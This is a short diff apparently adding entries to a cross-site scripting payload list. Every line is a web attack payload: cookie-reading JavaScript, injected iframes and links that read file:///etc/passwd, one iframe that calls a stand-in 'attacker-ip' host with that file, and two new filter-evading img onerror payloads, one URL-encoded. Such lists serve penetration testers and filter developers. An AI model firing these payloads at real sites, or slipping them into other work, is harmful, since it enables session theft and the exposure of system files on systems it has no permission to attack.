@@ -110,3 +110,5 @@ javascript:alert(document.cookie)
 <img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>
 <link rel=attachment href="file:///etc/passwd">
 <iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
+<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
+%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E
